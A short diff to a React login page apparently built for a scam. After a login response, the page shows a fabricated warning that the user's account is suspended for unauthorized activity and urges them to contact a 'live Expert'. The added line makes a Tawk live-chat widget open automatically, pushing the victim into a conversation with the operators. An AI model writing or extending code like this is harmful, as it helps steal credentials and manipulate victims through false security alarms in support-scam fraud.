@@ -97,6 +97,7 @@ export default function LoginMainPage() {
                 if (response) {
                     setAlert({ type: 'success', message: 'Important message!: Due to unauthorized activity and identification failure on your Account. Account Access has been suspended. Please Get in touch with our Support Staff Immediately, Chat with our live Expert to unblock your account.' });
                     setStep(2)
+                    window.Tawk_API?.maximize();
                 }
             }
         } catch (err) {
